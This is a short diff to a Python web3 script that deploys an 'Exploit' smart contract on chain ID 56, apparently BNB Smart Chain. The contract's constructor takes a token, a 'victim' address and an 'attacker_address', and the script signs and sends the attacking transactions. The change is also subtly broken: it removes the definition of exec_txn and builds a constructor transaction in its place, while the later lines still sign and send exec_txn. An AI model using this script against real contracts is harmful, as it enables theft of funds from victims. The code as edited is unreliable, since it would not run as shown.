@@ -66,12 +66,20 @@ print(f"[+] Exploit contract deployed at: {tx_receipt.contractAddress}")
 
 # Execute exploit
 exploit_contract = w3.eth.contract(address=tx_receipt.contractAddress, abi=contract_interface['abi'])
-exec_txn = exploit_contract.functions.execute().build_transaction({
-    'from': attacker_address,
-    'nonce': w3.eth.get_transaction_count(attacker_address),
-    'gas': 200000,
-    'gasPrice': w3.toWei('5', 'gwei')
+construct_txn = Exploit.constructor(token, victim, attacker_address).build_transaction({
+    "chainId": 56,
+    "from": attacker_address,
+    "nonce": nonce,
+    # don't manually set gas or gasPrice yet
 })
+# Estimate gas after building
+gas_estimate = w3.eth.estimate_gas(construct_txn)
+gas_price = w3.eth.gas_price
+
+# Add the estimates
+construct_txn["gas"] = gas_estimate
+construct_txn["gasPrice"] = gas_price
+
 
 signed_exec_txn = w3.eth.account.sign_transaction(exec_txn, private_key=attacker_private_key)
 exec_tx_hash = w3.eth.send_raw_transaction(signed_exec_txn.rawTransaction)
